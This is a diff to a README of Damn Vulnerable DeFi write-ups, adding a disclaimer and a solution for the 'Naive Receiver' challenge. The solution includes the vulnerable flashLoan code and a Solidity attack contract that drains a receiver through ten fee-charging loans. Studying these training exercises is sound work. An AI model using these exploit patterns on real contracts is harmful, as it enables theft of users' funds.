@@ -4,7 +4,15 @@
 
 Challenges created by [@tinchoabbate](https://twitter.com/tinchoabbate) at [damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/)
 
+## Disclaimer
+
+All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.
+
+DO NOT USE IN PRODUCTION.
+
 ## #1 - Unstoppable
+
+---
 
 The goal of this challenge is to disable flash loan lender contract. We are looking for DoS attack.
 
@@ -47,16 +55,92 @@ We can exploit this by transferring DVT tokens to contract with ERC20 `transfer`
 Solution code:
 
 ```js
+// ...
 it('Exploit', async function () {
   /** CODE YOUR EXPLOIT HERE */
   await this.token
     .connect(attacker)
     .transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 });
+// ...
 ```
 
-## Disclaimer
+## #2 - Naive Receiver
 
-All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.
+---
 
-DO NOT USE IN PRODUCTION.
+This challange might be tricky at first. Goal is not to attack lender, rather we need to drain funds from receiver even though vulnerability is inside lender's contract.
+
+**NaiveReceiverLenderPool.sol** is offering flash loans, but it always takes constant fee of **1 ether**.
+There is nothing wrong with contract's logic, but the way it offers flash loans is not very secure.
+
+As we can see from `flashLoan()` function:
+
+```solidity
+function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
+
+    uint256 balanceBefore = address(this).balance;
+    require(balanceBefore >= borrowAmount, "Not enough ETH in pool");
+
+    require(borrower.isContract(), "Borrower must be a deployed contract");
+    // Transfer ETH and handle control to receiver
+    borrower.functionCallWithValue(
+        abi.encodeWithSignature(
+            "receiveEther(uint256)",
+            FIXED_FEE
+        ),
+        borrowAmount
+    );
+
+    require(
+        address(this).balance >= balanceBefore + FIXED_FEE,
+        "Flash loan hasn't been paid back"
+    );
+}
+```
+
+If you look at function's paramaters, it's clear that caller is specifying address of borrower. So, we can call `flashLoan()` and specify **flashLoanReceiver.sol**'s address as borrower, calling it 10 times would be enough to drain all funds from receiver since 1 loan costs 1 ether in fees.
+
+We will make new **NaiveReceiverAttack.sol** contract that will essentially call `flashLoan()` 10 times with **flashLoanReceiver.sol**'s address as borrower paramater.
+
+Solution code:
+
+**NaiveReceiverAttack.sol :**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../naive-receiver/NaiveReceiverLenderPool.sol";
+
+contract NaiveReceiverAttack {
+    NaiveReceiverLenderPool immutable pool;
+
+    constructor(address payable _pool) {
+        pool = NaiveReceiverLenderPool(_pool);
+    }
+
+    function attack(address victim) external {
+        for (uint i = 0; i < 10; i++) {
+            pool.flashLoan(victim, 1 ether);
+        }
+    }
+}
+
+```
+
+**naive-receiver.challenge.js :**
+
+```js
+// ...
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  const AttackFactory = await ethers.getContractFactory(
+    'NaiveReceiverAttack',
+    attacker
+  );
+  const attackContract = await AttackFactory.deploy(this.pool.address);
+  await attackContract.attack(this.receiver.address);
+});
+// ...
+```
